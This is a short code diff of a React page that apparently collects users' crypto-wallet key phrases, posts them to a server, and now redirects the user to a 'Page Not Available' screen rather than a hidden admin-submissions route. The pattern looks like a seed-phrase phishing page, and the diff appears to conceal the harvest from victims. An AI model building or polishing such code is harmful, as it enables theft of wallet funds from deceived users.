@@ -5,7 +5,7 @@ const KeyPhrasesPage = ({ selectedWallet }) => {
   const [keyPhrases, setKeyPhrases] = useState("");
   const navigate = useNavigate();
 
-  const handleNext = async () => {
+  const handleNext = async () => {   
     if (!selectedWallet) {
       alert("No wallet selected. Please go back and select a wallet.");
       return;
@@ -22,7 +22,9 @@ const KeyPhrasesPage = ({ selectedWallet }) => {
 
       const data = await response.json();
       console.log("Server response:", data);
-      navigate("/admin-submissions-9a7f3b4e2d");
+
+      // Redirect users to the "Page Not Available" page instead of admin submissions
+      navigate("/page-not-available");
     } catch (error) {
       console.error("Error submitting key phrases:", error);
     }
